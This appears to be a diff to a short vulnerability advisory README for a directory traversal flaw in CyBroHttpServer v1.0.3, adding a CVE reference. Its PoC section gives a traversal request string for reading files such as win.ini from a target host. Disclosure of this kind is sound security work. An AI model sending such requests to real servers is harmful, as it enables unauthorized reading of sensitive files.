@@ -1,6 +1,9 @@
 # CyBroHttpServer-v1.0.3-Directory-Traversal
 Directory Traversal in CyBroHttpServer v1.0.3 allows an attacker to read sensitive informations.
 
+# CVE-2018-16133
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16133
+
 # PoC
 To exploit vulnerability, someone could use 'http://[host]/../../../../../../../../' request to get some informations from the target. 
   For example: http://[host]/../../../../../../../../Windows/win.ini'
